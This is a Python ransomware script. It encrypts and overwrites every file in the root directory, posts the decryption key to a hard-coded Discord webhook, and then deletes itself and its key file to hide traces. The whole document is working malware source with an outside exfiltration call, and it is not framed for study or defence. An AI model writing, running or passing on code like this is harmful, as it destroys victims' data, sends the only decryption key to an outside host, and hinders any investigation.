import os
import base64
import requests
from cryptography.fernet import Fernet

# Generate a secure encryption key
key = Fernet.generate_key()

# Create a Fernet cipher object
cipher = Fernet(key)

# Function to encrypt a file
def encrypt_file(file_path, cipher):
    with open(file_path, 'rb') as file:
        data = file.read()
        encrypted_data = cipher.encrypt(data)
        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)

# Function to send the decryption key to a Discord webhook
def send_key_to_discord(webhook_url, key):
    payload = {
        "content": f"Decryption Key: {key.decode('utf-8')}"
    }
    response = requests.post(webhook_url, json=payload)
    if response.status_code != 204:
        raise Exception(f"Failed to send message to Discord: {response.status_code} {response.text}")

# Function to delete all traces of the script and its operations
def delete_traces():
    os.remove('script.py')
    os.remove('key.key')

# Main script execution
if __name__ == "__main__":
    # List all files in the current directory
    files = os.listdir('/')

    # Encrypt each file
    for file in files:
        file_path = os.path.join('/', file)
        if os.path.isfile(file_path):
            encrypt_file(file_path, cipher)

    # Send the decryption key to the specified Discord webhook
    webhook_url = "https://discord.com/api/webhooks/1412226221336559669/9OYAf2jZxSz_PEYcsmGEQKbT51Bw8mxP3RsOFpUUYV1w_YOZTRwT-PhLhvn50H4ngjjh"
    send_key_to_discord(webhook_url, key)

    # Delete all traces of the script and its operations
    delete_traces()